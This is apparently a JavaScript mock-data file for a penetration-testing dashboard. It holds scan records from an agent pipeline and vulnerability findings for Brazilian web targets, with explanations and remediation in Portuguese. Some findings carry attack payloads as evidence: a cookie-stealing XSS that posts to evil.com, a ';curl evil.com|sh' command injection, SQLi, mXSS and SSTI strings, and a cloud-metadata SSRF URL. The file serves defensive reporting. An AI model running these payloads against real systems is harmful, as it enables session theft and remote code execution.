/* ========================================
   ConstruData Shield - SPA Dashboard App
   Realistic data based on actual system structure:
   - 13 agents (pre-recon, recon, 5 vuln, 5 exploit, report)
   - session.json format with AgentEndResult
   - Real deliverable file names
   ======================================== */

/* ── Agent Pipeline Definition (matches src/session-manager.ts) ── */
const AGENTS = [
  { id: 'pre-recon', name: 'Pre-Recon', icon: 'fa-magnifying-glass-chart', phase: 'pre-recon' },
  { id: 'recon', name: 'Recon', icon: 'fa-satellite-dish', phase: 'recon' },
  { id: 'injection-vuln', name: 'Injection Analysis', icon: 'fa-database', phase: 'vulnerability-analysis' },
  { id: 'xss-vuln', name: 'XSS Analysis', icon: 'fa-code', phase: 'vulnerability-analysis' },
  { id: 'auth-vuln', name: 'Auth Analysis', icon: 'fa-key', phase: 'vulnerability-analysis' },
  { id: 'ssrf-vuln', name: 'SSRF Analysis', icon: 'fa-globe', phase: 'vulnerability-analysis' },
  { id: 'authz-vuln', name: 'AuthZ Analysis', icon: 'fa-user-lock', phase: 'vulnerability-analysis' },
  { id: 'injection-exploit', name: 'Injection Exploit', icon: 'fa-syringe', phase: 'exploitation' },
  { id: 'xss-exploit', name: 'XSS Exploit', icon: 'fa-bug', phase: 'exploitation' },
  { id: 'auth-exploit', name: 'Auth Exploit', icon: 'fa-unlock', phase: 'exploitation' },
  { id: 'ssrf-exploit', name: 'SSRF Exploit', icon: 'fa-network-wired', phase: 'exploitation' },
  { id: 'authz-exploit', name: 'AuthZ Exploit', icon: 'fa-shield-halved', phase: 'exploitation' },
  { id: 'report', name: 'Report', icon: 'fa-clipboard-check', phase: 'reporting' },
];

/* ── Realistic Data Store (simulates audit-logs/session.json) ── */
const Store = {
  scans: [
    {
      id: 'SC-7f3a1b2c', target: 'staging.lojaexemplo.com.br', type: 'Full Pipeline', status: 'completed', vulns: 41,
      duration: '1h 18m', cost: 52.70, date: '2026-03-06', repo: 'loja-exemplo', workspace: 'audit-mar-2026',
      agents: { 'pre-recon': { success: true, duration_ms: 145200, cost_usd: 3.80 }, 'recon': { success: true, duration_ms: 312400, cost_usd: 5.20 }, 'injection-vuln': { success: true, duration_ms: 198000, cost_usd: 4.10 }, 'xss-vuln': { success: true, duration_ms: 185000, cost_usd: 3.90 }, 'auth-vuln': { success: true, duration_ms: 220000, cost_usd: 4.50 }, 'ssrf-vuln': { success: true, duration_ms: 175000, cost_usd: 3.70 }, 'authz-vuln': { success: true, duration_ms: 195000, cost_usd: 4.00 }, 'injection-exploit': { success: true, duration_ms: 245000, cost_usd: 4.80 }, 'xss-exploit': { success: true, duration_ms: 230000, cost_usd: 4.60 }, 'auth-exploit': { success: true, duration_ms: 260000, cost_usd: 5.10 }, 'ssrf-exploit': { success: false, duration_ms: 180000, cost_usd: 3.50 }, 'authz-exploit': { success: true, duration_ms: 210000, cost_usd: 4.20 }, 'report': { success: true, duration_ms: 125000, cost_usd: 1.30 } }
    },
    {
      id: 'SC-a92e4d1f', target: 'api.gestaoobras.com.br', type: 'API Only', status: 'completed', vulns: 18,
      duration: '47m', cost: 34.80, date: '2026-03-05', repo: 'gestao-obras-api', workspace: null,
      agents: { 'pre-recon': { success: true, duration_ms: 98000, cost_usd: 2.90 }, 'recon': { success: true, duration_ms: 210000, cost_usd: 4.10 }, 'injection-vuln': { success: true, duration_ms: 165000, cost_usd: 3.60 }, 'xss-vuln': { success: true, duration_ms: 145000, cost_usd: 3.20 }, 'auth-vuln': { success: true, duration_ms: 180000, cost_usd: 3.80 }, 'ssrf-vuln': { success: true, duration_ms: 155000, cost_usd: 3.40 }, 'authz-vuln': { success: true, duration_ms: 170000, cost_usd: 3.60 }, 'report': { success: true, duration_ms: 115000, cost_usd: 1.20 } }
    },
    {
      id: 'SC-c5b8e30a', target: 'portal.construtechbr.com', type: 'Full Pipeline', status: 'running', vulns: null,
      duration: '28m', cost: 19.40, date: '2026-03-07', repo: 'construtech-portal', workspace: 'sprint-15-audit',
      agents: { 'pre-recon': { success: true, duration_ms: 132000, cost_usd: 3.50 }, 'recon': { success: true, duration_ms: 290000, cost_usd: 4.90 }, 'injection-vuln': { success: true, duration_ms: 190000, cost_usd: 4.00 }, 'xss-vuln': { success: null, duration_ms: null, cost_usd: null } }
    },
    {
      id: 'SC-d1f7a6b4', target: 'auth.plataformaseg.com', type: 'Auth Focus', status: 'completed', vulns: 9,
      duration: '22m', cost: 18.60, date: '2026-03-04', repo: 'plataforma-seg', workspace: null,
      agents: { 'pre-recon': { success: true, duration_ms: 88000, cost_usd: 2.40 }, 'recon': { success: true, duration_ms: 165000, cost_usd: 3.20 }, 'auth-vuln': { success: true, duration_ms: 240000, cost_usd: 4.80 }, 'auth-exploit': { success: true, duration_ms: 280000, cost_usd: 5.40 }, 'report': { success: true, duration_ms: 105000, cost_usd: 1.10 } }
    },
    {
      id: 'SC-e8c2f519', target: 'erp.construmais.com.br', type: 'Full Pipeline', status: 'failed', vulns: 7,
      duration: '38m', cost: 28.90, date: '2026-03-03', repo: 'construmais-erp', workspace: 'pen-test-q1',
      agents: { 'pre-recon': { success: true, duration_ms: 155000, cost_usd: 3.90 }, 'recon': { success: true, duration_ms: 340000, cost_usd: 5.60 }, 'injection-vuln': { success: true, duration_ms: 205000, cost_usd: 4.20 }, 'xss-vuln': { success: true, duration_ms: 178000, cost_usd: 3.80 }, 'auth-vuln': { success: false, duration_ms: 45000, cost_usd: 1.20, error: 'Target returned 503 during auth testing' }, 'ssrf-vuln': { success: true, duration_ms: 160000, cost_usd: 3.40 }, 'authz-vuln': { success: false, duration_ms: 30000, cost_usd: 0.80, error: 'Connection refused on port 443' } }
    },
    {
      id: 'SC-f4a9d832', target: 'app.imobtech.com', type: 'Full Pipeline', status: 'completed', vulns: 56,
      duration: '1h 42m', cost: 67.30, date: '2026-03-01', repo: 'imobtech-app', workspace: 'assessment-fev',
      agents: { 'pre-recon': { success: true, duration_ms: 198000, cost_usd: 4.60 }, 'recon': { success: true, duration_ms: 420000, cost_usd: 6.80 }, 'injection-vuln': { success: true, duration_ms: 280000, cost_usd: 5.40 }, 'xss-vuln': { success: true, duration_ms: 265000, cost_usd: 5.10 }, 'auth-vuln': { success: true, duration_ms: 310000, cost_usd: 5.80 }, 'ssrf-vuln': { success: true, duration_ms: 240000, cost_usd: 4.80 }, 'authz-vuln': { success: true, duration_ms: 255000, cost_usd: 5.00 }, 'injection-exploit': { success: true, duration_ms: 320000, cost_usd: 6.20 }, 'xss-exploit': { success: true, duration_ms: 290000, cost_usd: 5.60 }, 'auth-exploit': { success: true, duration_ms: 340000, cost_usd: 6.40 }, 'ssrf-exploit': { success: true, duration_ms: 270000, cost_usd: 5.30 }, 'authz-exploit': { success: true, duration_ms: 285000, cost_usd: 5.50 }, 'report': { success: true, duration_ms: 145000, cost_usd: 1.80 } }
    },
    {
      id: 'SC-1b2e8c4a', target: 'painel.engecorp.com.br', type: 'Recon Only', status: 'completed', vulns: 0,
      duration: '14m', cost: 8.20, date: '2026-02-27', repo: 'engecorp-painel', workspace: null,
      agents: { 'pre-recon': { success: true, duration_ms: 110000, cost_usd: 3.10 }, 'recon': { success: true, duration_ms: 250000, cost_usd: 5.10 } }
    },
  ],

  vulns: [
    // SC-7f3a1b2c (loja-exemplo)
    { id: 'V-001', title: 'SQL Injection via search parameter: /api/produtos?q=\' OR 1=1--', severity: 'critical', category: 'Injection', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'injection-vuln', endpoint: 'GET /api/produtos?q=', evidence: 'Time-based blind SQLi confirmed, 5s delay on sleep(5)', cvss: 9.8, cwe: 'CWE-89',
      explanation: 'SQL Injection ocorre quando dados do usuario sao inseridos diretamente em queries SQL sem sanitizacao. O atacante pode manipular a query para extrair, modificar ou deletar dados do banco. Neste caso, o parametro "q" da busca e concatenado diretamente na query SQL.',
      impact: 'Acesso total ao banco de dados: leitura de senhas, dados de clientes, pedidos, cartoes. Possivel execucao de comandos no servidor via xp_cmdshell (SQL Server) ou LOAD_FILE (MySQL).',
      remediation: 'Use prepared statements/parameterized queries. Exemplo: db.query("SELECT * FROM produtos WHERE nome LIKE ?", ["%"+q+"%"]). Nunca concatene input do usuario em SQL.',
      references: ['https://owasp.org/www-community/attacks/SQL_Injection', 'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html'] },
    { id: 'V-002', title: 'Stored XSS in product review field (bypasses DOMPurify via mXSS)', severity: 'critical', category: 'XSS', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'xss-vuln', endpoint: 'POST /api/reviews', evidence: '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>', cvss: 9.1, cwe: 'CWE-79',
      explanation: 'Cross-Site Scripting (XSS) Stored acontece quando o servidor armazena codigo malicioso enviado pelo usuario e o exibe para outros usuarios. Neste caso, o campo de avaliacao de produto aceita HTML que, ao ser renderizado, executa JavaScript no navegador da vitima. O payload usa mXSS (mutation XSS) para burlar o DOMPurify.',
      impact: 'Roubo de cookies de sessao, redirecionamento para phishing, keylogging, defacement da pagina, propagacao de worm (cada usuario que ve a review e infectado).',
      remediation: 'Sanitize no backend com allowlist de tags HTML seguras. Encode output com htmlspecialchars(). Use Content-Security-Policy header. Atualize DOMPurify para versao mais recente que corrige mXSS.',
      references: ['https://owasp.org/www-community/attacks/xss/', 'https://cure53.de/fp170.pdf'] },
    { id: 'V-003', title: 'JWT secret is "secret123" - brute-forced in <1 second', severity: 'critical', category: 'Authentication', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'auth-vuln', endpoint: 'POST /api/auth/login', evidence: 'jwt-cracker found secret in 0.3s, forged admin token', cvss: 9.8, cwe: 'CWE-347',
      explanation: 'JSON Web Tokens (JWT) sao assinados com uma chave secreta. Se essa chave for fraca (como "secret123"), um atacante pode usar ferramentas como jwt-cracker para descobri-la por forca bruta em segundos. Com a chave, ele pode forjar tokens validos para qualquer usuario, incluindo admin.',
      impact: 'Acesso total como qualquer usuario do sistema. O atacante pode criar tokens admin, acessar dados de todos os clientes, modificar pedidos e configuracoes.',
      remediation: 'Use uma chave secreta com pelo menos 256 bits de entropia (ex: openssl rand -hex 32). Considere migrar para RS256 (chaves assimetricas). Implemente rotacao de chaves.',
      references: ['https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/', 'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens'] },
    { id: 'V-004', title: 'IDOR: /api/pedidos/:id returns any users order data', severity: 'high', category: 'Authorization', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'authz-vuln', endpoint: 'GET /api/pedidos/1337', evidence: 'User A can access User B orders by incrementing ID', cvss: 7.5, cwe: 'CWE-639',
      explanation: 'Insecure Direct Object Reference (IDOR) ocorre quando a aplicacao usa IDs sequenciais e nao verifica se o usuario autenticado tem permissao para acessar o recurso. Incrementando o ID na URL, qualquer usuario pode ver pedidos de outros clientes.',
      impact: 'Exposicao de dados pessoais (nome, endereco, CPF) e historico de compras de todos os clientes. Viola LGPD e pode gerar multas de ate 2% do faturamento.',
      remediation: 'Valide que o usuario autenticado e dono do recurso: if (pedido.userId !== req.user.id) return 403. Use UUIDs ao inves de IDs sequenciais. Implemente middleware de autorizacao.',
      references: ['https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/', 'https://portswigger.net/web-security/access-control/idor'] },
    { id: 'V-005', title: 'SSRF via image URL in /api/produtos/import allows internal network scanning', severity: 'high', category: 'SSRF', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'ssrf-vuln', endpoint: 'POST /api/produtos/import', evidence: 'Successfully accessed http://169.254.169.254/latest/meta-data/', cvss: 8.6, cwe: 'CWE-918',
      explanation: 'Server-Side Request Forgery (SSRF) ocorre quando o servidor faz requisicoes HTTP baseadas em URLs fornecidas pelo usuario sem validacao. O atacante pode acessar servicos internos (Redis, banco de dados, metadata de cloud) que nao estao expostos na internet.',
      impact: 'Acesso a credenciais AWS/GCP via endpoint de metadata (169.254.169.254). Scan de rede interna. Acesso a servicos como Redis, Elasticsearch, bancos de dados internos. Possivel RCE via servicos internos.',
      remediation: 'Implemente allowlist de dominios permitidos. Bloqueie ranges de IPs internos (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16). Use SSRF-safe HTTP client libraries.',
      references: ['https://owasp.org/www-community/attacks/Server_Side_Request_Forgery', 'https://portswigger.net/web-security/ssrf'] },
    { id: 'V-006', title: 'Mass assignment: POST /api/users accepts role field, escalation to admin', severity: 'high', category: 'Authorization', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'authz-exploit', endpoint: 'POST /api/users', evidence: '{"email":"test@x.com","role":"admin"} created admin account', cvss: 8.1, cwe: 'CWE-915',
      explanation: 'Mass Assignment ocorre quando a API aceita e processa campos que nao deveriam ser editaveis pelo usuario. Neste caso, o campo "role" e aceito no body do request de criacao de usuario, permitindo que qualquer pessoa se cadastre como admin.',
      impact: 'Escalacao de privilegios: qualquer usuario pode se tornar administrador. Acesso total ao painel admin, dados de todos os usuarios, configuracoes do sistema.',
      remediation: 'Use allowlist de campos permitidos: const { email, password, name } = req.body (ignorando role). Nunca use Object.assign(user, req.body) diretamente. Use DTOs para validar input.',
      references: ['https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/', 'https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html'] },
    { id: 'V-007', title: 'Reflected XSS in /busca?q= parameter (no output encoding)', severity: 'high', category: 'XSS', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'xss-vuln', endpoint: 'GET /busca?q=', evidence: '/busca?q=<script>fetch("https://evil.com/"+document.cookie)</script>', cvss: 6.1, cwe: 'CWE-79',
      explanation: 'XSS Refletido ocorre quando o input do usuario e refletido diretamente na pagina sem encoding. Diferente do Stored, o payload nao e armazenado - ele vem na URL e e executado quando a vitima clica em um link malicioso enviado por phishing.',
      impact: 'Roubo de sessao via cookie theft. O atacante envia link por email/WhatsApp, a vitima clica, e o JavaScript exfiltra o cookie de sessao para o servidor do atacante.',
      remediation: 'Encode toda saida HTML: use textContent ao inves de innerHTML. No servidor, escape com htmlspecialchars(). Implemente CSP (Content-Security-Policy) header.',
      references: ['https://owasp.org/www-community/attacks/xss/', 'https://portswigger.net/web-security/cross-site-scripting/reflected'] },
    { id: 'V-008', title: 'Missing rate limit on /api/auth/login (brute force possible)', severity: 'medium', category: 'Authentication', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'auth-vuln', endpoint: 'POST /api/auth/login', evidence: '1000 requests in 10 seconds without blocking', cvss: 5.3, cwe: 'CWE-307',
      explanation: 'Sem rate limiting, um atacante pode tentar milhares de combinacoes de senha por segundo ate encontrar a correta. Ferramentas como Hydra ou Burp Intruder automatizam esse processo.',
      impact: 'Comprometimento de contas com senhas fracas. Dicionarios de senhas comuns (rockyou.txt) permitem quebrar senhas como "123456", "password" em segundos.',
      remediation: 'Implemente rate limiting: maximo 5 tentativas por minuto por IP/usuario. Use express-rate-limit ou similar. Apos 5 falhas, exija CAPTCHA. Apos 20, bloqueie temporariamente.',
      references: ['https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks', 'https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html'] },
    { id: 'V-009', title: 'CORS allows any origin with credentials', severity: 'medium', category: 'Configuration', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'recon', endpoint: '*', evidence: 'Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true', cvss: 5.4, cwe: 'CWE-942',
      explanation: 'CORS (Cross-Origin Resource Sharing) mal configurado permite que qualquer site faca requisicoes autenticadas para sua API. Com Allow-Origin: * e Allow-Credentials: true, um site malicioso pode fazer fetch() para sua API usando os cookies da vitima.',
      impact: 'Um site malicioso pode ler dados privados do usuario (pedidos, perfil, dados de pagamento) sem que a vitima perceba, apenas visitando uma pagina controlada pelo atacante.',
      remediation: 'Configure CORS com allowlist de origens especificas: cors({ origin: ["https://lojaexemplo.com.br"], credentials: true }). Nunca use wildcard (*) com credentials.',
      references: ['https://portswigger.net/web-security/cors', 'https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS'] },
    { id: 'V-010', title: 'Password reset token is sequential (guessable)', severity: 'medium', category: 'Authentication', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'auth-exploit', endpoint: 'POST /api/auth/reset', evidence: 'Tokens are base64(user_id + timestamp), predictable', cvss: 6.5, cwe: 'CWE-640',
      explanation: 'Tokens de reset de senha devem ser aleatorios e imprevisives. Neste caso, o token e apenas base64(user_id + timestamp), que pode ser facilmente calculado pelo atacante sabendo o ID do usuario e o horario aproximado do pedido.',
      impact: 'O atacante pode resetar a senha de qualquer usuario sem acesso ao email. Basta saber o user_id e fazer o request na mesma janela de tempo.',
      remediation: 'Gere tokens com crypto.randomBytes(32).toString("hex"). Armazene hash do token no banco (nao o token em texto). Expire em 15 minutos. Use uma unica vez.',
      references: ['https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html'] },
    { id: 'V-011', title: 'Express stack traces exposed in production errors', severity: 'low', category: 'Information Disclosure', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'recon', endpoint: 'GET /api/undefined', evidence: 'Full stack trace with file paths and dependency versions', cvss: 3.7, cwe: 'CWE-209',
      explanation: 'Em modo de desenvolvimento, Express exibe stack traces completos nos erros. Se isso esta ativo em producao, o atacante ve caminhos de arquivos no servidor, versoes de dependencias e detalhes internos que facilitam outros ataques.',
      impact: 'Exposicao de informacoes internas: caminhos de arquivos (/home/deploy/app/), versoes de pacotes (express@4.18.2), estrutura do projeto. Facilita planejamento de ataques direcionados.',
      remediation: 'Configure NODE_ENV=production. Use error handler customizado que retorna apenas mensagem generica: app.use((err, req, res, next) => res.status(500).json({ error: "Internal server error" })).',
      references: ['https://expressjs.com/en/advanced/best-practice-security.html'] },
    { id: 'V-012', title: 'Missing HSTS header on all responses', severity: 'low', category: 'Configuration', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'open', agent: 'recon', endpoint: '*', evidence: 'Strict-Transport-Security header not present', cvss: 3.1, cwe: 'CWE-319',
      explanation: 'HSTS (HTTP Strict Transport Security) forca o navegador a sempre usar HTTPS. Sem ele, um atacante em uma rede WiFi publica pode interceptar a primeira requisicao HTTP (antes do redirect para HTTPS) e fazer um ataque man-in-the-middle.',
      impact: 'Possibilidade de downgrade para HTTP em redes nao seguras. Interceptacao de credenciais e cookies na primeira requisicao.',
      remediation: 'Adicione o header: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload. No Express: app.use(helmet.hsts({ maxAge: 31536000 })).',
      references: ['https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security'] },
    { id: 'V-013', title: 'Session cookies missing HttpOnly flag', severity: 'low', category: 'Session', target: 'staging.lojaexemplo.com.br', scan: 'SC-7f3a1b2c', status: 'fixed', agent: 'auth-vuln', endpoint: '*', evidence: 'Set-Cookie: session=... (no HttpOnly)', cvss: 3.5, cwe: 'CWE-1004',
      explanation: 'O flag HttpOnly impede que JavaScript acesse o cookie via document.cookie. Sem ele, um ataque XSS pode facilmente roubar o cookie de sessao e enviar para o servidor do atacante.',
      impact: 'Se combinado com qualquer XSS, permite roubo completo da sessao do usuario. O atacante pode se passar pelo usuario sem saber a senha.',
      remediation: 'Configure cookies com HttpOnly e Secure: res.cookie("session", token, { httpOnly: true, secure: true, sameSite: "strict" }).',
      references: ['https://owasp.org/www-community/HttpOnly'] },
    // SC-a92e4d1f (gestao-obras-api)
    { id: 'V-014', title: 'NoSQL Injection in /api/obras?filter={$gt:""}', severity: 'critical', category: 'Injection', target: 'api.gestaoobras.com.br', scan: 'SC-a92e4d1f', status: 'open', agent: 'injection-vuln', endpoint: 'GET /api/obras?filter=', evidence: 'MongoDB operator injection returns all documents', cvss: 9.8, cwe: 'CWE-943',
      explanation: 'NoSQL Injection e similar ao SQL Injection, mas em bancos NoSQL como MongoDB. Ao enviar operadores MongoDB como {$gt:""} no parametro filter, o atacante pode manipular a query para retornar todos os documentos da colecao, bypassing filtros de acesso.',
      impact: 'Acesso a todos os dados de obras, orcamentos, contratos e informacoes confidenciais de clientes. Possivel exfiltracao massiva de dados.',
      remediation: 'Valide e sanitize input: rejeite objetos que contenham chaves comecando com $. Use mongo-sanitize. Defina schema estrito com Mongoose validators.',
      references: ['https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection'] },
    { id: 'V-015', title: 'API key transmitted in URL query parameter', severity: 'high', category: 'Authentication', target: 'api.gestaoobras.com.br', scan: 'SC-a92e4d1f', status: 'open', agent: 'auth-vuln', endpoint: 'GET /api/*?api_key=', evidence: 'API key visible in server access logs and browser history', cvss: 7.4, cwe: 'CWE-598',
      explanation: 'API keys na URL query string ficam visiveis em logs do servidor, historico do navegador, referer headers e proxies intermediarios. Qualquer pessoa com acesso a esses logs pode obter a chave.',
      impact: 'Chave de API exposta em logs pode ser usada por terceiros para acessar a API com as permissoes do dono da chave, consumir cota e acessar dados privados.',
      remediation: 'Transmita API keys no header Authorization: Authorization: Bearer <api_key>. Nunca na URL. Configure logs para nao registrar headers de autorizacao.',
      references: ['https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/'] },
    { id: 'V-016', title: 'Broken function level authorization on /api/admin/* endpoints', severity: 'high', category: 'Authorization', target: 'api.gestaoobras.com.br', scan: 'SC-a92e4d1f', status: 'open', agent: 'authz-vuln', endpoint: 'GET /api/admin/users', evidence: 'Regular user token accepted on admin endpoints', cvss: 8.2, cwe: 'CWE-285',
      explanation: 'Os endpoints administrativos (/api/admin/*) nao verificam se o usuario tem role de admin. Qualquer usuario autenticado pode acessar funcionalidades administrativas simplesmente chamando a URL.',
      impact: 'Usuarios comuns podem gerenciar outros usuarios, ver dados sensives, alterar configuracoes do sistema, exportar relatorios confidenciais.',
      remediation: 'Implemente middleware de autorizacao por role: function requireAdmin(req, res, next) { if (req.user.role !== "admin") return res.status(403).json({error: "Forbidden"}); next(); }',
      references: ['https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/'] },
    { id: 'V-017', title: 'Unrestricted file upload accepts .php files', severity: 'high', category: 'Injection', target: 'api.gestaoobras.com.br', scan: 'SC-a92e4d1f', status: 'open', agent: 'injection-vuln', endpoint: 'POST /api/documentos/upload', evidence: 'Uploaded shell.php.jpg, accessible at /uploads/shell.php.jpg', cvss: 8.8, cwe: 'CWE-434',
      explanation: 'O endpoint de upload nao valida corretamente o tipo de arquivo. Um atacante pode fazer upload de um arquivo PHP disfarado (shell.php.jpg) que, dependendo da configuracao do servidor, sera executado como PHP, dando ao atacante shell remoto no servidor.',
      impact: 'Remote Code Execution (RCE): o atacante pode executar comandos no servidor, ler arquivos de configuracao com senhas, instalar backdoors, pivotar para a rede interna.',
      remediation: 'Valide tipo de arquivo por magic bytes (nao pela extensao). Use allowlist de extensoes (.pdf, .doc, .jpg). Armazene uploads fora do webroot. Use nomes aleatorios. Sirva com Content-Disposition: attachment.',
      references: ['https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload', 'https://portswigger.net/web-security/file-upload'] },
    // SC-d1f7a6b4 (plataforma-seg)
    { id: 'V-018', title: 'OAuth2 state parameter not validated (CSRF on login)', severity: 'critical', category: 'Authentication', target: 'auth.plataformaseg.com', scan: 'SC-d1f7a6b4', status: 'open', agent: 'auth-vuln', endpoint: 'GET /oauth/callback', evidence: 'Replayed callback URL without state param, session hijacked', cvss: 9.3, cwe: 'CWE-352',
      explanation: 'O parametro "state" no OAuth2 protege contra CSRF. Sem ele, um atacante pode forjar o callback URL e logar a vitima na conta do atacante (login CSRF) ou hijackar a sessao OAuth da vitima.',
      impact: 'Hijack de sessao: o atacante intercepta o authorization code da vitima e o usa para autenticar como ela. Ou forca a vitima a logar na conta do atacante para capturar dados.',
      remediation: 'Gere um state aleatorio antes de redirecionar para o provider OAuth: state = crypto.randomBytes(16).toString("hex"). Valide que o state retornado no callback corresponde ao armazenado na sessao.',
      references: ['https://datatracker.ietf.org/doc/html/rfc6749#section-10.12', 'https://portswigger.net/web-security/oauth'] },
    { id: 'V-019', title: 'Refresh token never expires and can be reused after revocation', severity: 'high', category: 'Authentication', target: 'auth.plataformaseg.com', scan: 'SC-d1f7a6b4', status: 'open', agent: 'auth-exploit', endpoint: 'POST /oauth/token', evidence: 'Revoked refresh token still produces new access tokens', cvss: 7.6, cwe: 'CWE-613',
      explanation: 'Refresh tokens devem ter expiracao e serem invalidados apos revogacao. Neste caso, mesmo apos o usuario fazer logout (que deveria revogar o token), o token antigo ainda funciona para gerar novos access tokens.',
      impact: 'Persistencia de acesso: mesmo apos trocar a senha ou revogar sessoes, o atacante com um refresh token roubado mantem acesso indefinido a conta.',
      remediation: 'Armazene refresh tokens no banco com expiracao (ex: 30 dias). Ao revogar, delete do banco. Use refresh token rotation (cada uso gera um novo e invalida o anterior).',
      references: ['https://auth0.com/blog/refresh-tokens-what-are-they-and-when-to-use-them/'] },
    { id: 'V-020', title: 'Open redirect in /auth/callback?redirect_uri=', severity: 'medium', category: 'Authentication', target: 'auth.plataformaseg.com', scan: 'SC-d1f7a6b4', status: 'open', agent: 'auth-vuln', endpoint: 'GET /auth/callback', evidence: 'redirect_uri=https://evil.com accepted without validation', cvss: 4.7, cwe: 'CWE-601',
      explanation: 'Open redirect permite que o atacante use seu dominio para redirecionar vitimas para sites maliciosos. Como a URL comeca no seu dominio (confiavel), a vitima nao desconfia. Muito usado em phishing e roubo de tokens OAuth.',
      impact: 'Phishing convincente usando seu dominio como trampolim. Possivel roubo de authorization codes OAuth se combinado com manipulacao do redirect_uri.',
      remediation: 'Valide redirect_uri contra allowlist de URLs permitidas. Rejeite URLs com dominio diferente. Use path-only redirects quando possivel.',
      references: ['https://portswigger.net/kb/issues/00500100_open-redirection-reflected', 'https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html'] },
    // SC-f4a9d832 (imobtech-app)
    { id: 'V-021', title: 'Command injection in PDF export via filename: ;curl evil.com|sh', severity: 'critical', category: 'Injection', target: 'app.imobtech.com', scan: 'SC-f4a9d832', status: 'open', agent: 'injection-exploit', endpoint: 'POST /api/relatorios/pdf', evidence: 'Filename passed unsanitized to wkhtmltopdf shell command', cvss: 9.8, cwe: 'CWE-78',
      explanation: 'Command Injection (ou OS Injection) ocorre quando input do usuario e passado diretamente para comandos do sistema operacional. Neste caso, o nome do arquivo PDF e inserido em um comando shell sem sanitizacao, permitindo executar comandos arbitrarios.',
      impact: 'Remote Code Execution (RCE) completo no servidor. O atacante pode: ler /etc/passwd, instalar backdoors, roubar chaves SSH, pivotar para outros servidores na rede.',
      remediation: 'Nunca passe input do usuario para shell commands. Use APIs nativas ao inves de child_process.exec(). Se necessario, use execFile() com array de argumentos (sem shell). Sanitize com allowlist de caracteres alfanumericos.',
      references: ['https://owasp.org/www-community/attacks/Command_Injection', 'https://portswigger.net/web-security/os-command-injection'] },
    { id: 'V-022', title: 'SSTI in email template engine: {{constructor.constructor("return this")()}}', severity: 'critical', category: 'Injection', target: 'app.imobtech.com', scan: 'SC-f4a9d832', status: 'open', agent: 'injection-vuln', endpoint: 'POST /api/notificacoes/email', evidence: 'Nunjucks template injection confirmed, RCE achieved', cvss: 9.8, cwe: 'CWE-1336',
      explanation: 'Server-Side Template Injection (SSTI) ocorre quando input do usuario e processado por um template engine (Nunjucks, Jinja2, EJS). O atacante pode escapar do contexto do template e executar codigo no servidor. E uma das vulnerabilidades mais severas pois leva direto a RCE.',
      impact: 'Remote Code Execution completo. O atacante acessa o runtime do Node.js, pode ler arquivos, executar comandos, acessar variaveis de ambiente (incluindo API keys e senhas de banco).',
      remediation: 'Nunca insira input de usuario em templates server-side. Use templates pre-compilados com variaveis escapadas. Se necessario, use sandbox mode do template engine. Prefira template engines que nao permitem execucao de codigo (Mustache/Handlebars).',
      references: ['https://portswigger.net/web-security/server-side-template-injection', 'https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection'] },
    { id: 'V-023', title: 'GraphQL introspection enabled, exposes entire schema', severity: 'medium', category: 'Information Disclosure', target: 'app.imobtech.com', scan: 'SC-f4a9d832', status: 'open', agent: 'recon', endpoint: 'POST /graphql', evidence: '__schema { types { name fields { name } } } returns full schema', cvss: 5.3, cwe: 'CWE-200',
      explanation: 'GraphQL introspection e um recurso que permite consultar o schema completo da API (todos os types, queries, mutations e seus campos). Em producao, isso da ao atacante um mapa completo da API, facilitando a descoberta de endpoints sensiveis.',
      impact: 'O atacante descobre todos os endpoints, campos sensiveis (isAdmin, passwordHash, internalNotes), mutations perigosas (deleteUser, updateRole) sem precisar adivinhar.',
      remediation: 'Desabilite introspection em producao. No Apollo Server: new ApolloServer({ introspection: process.env.NODE_ENV !== "production" }). Implemente depth limiting e query complexity analysis.',
      references: ['https://www.apollographql.com/blog/graphql/security/why-you-should-disable-graphql-introspection-in-production/'] },
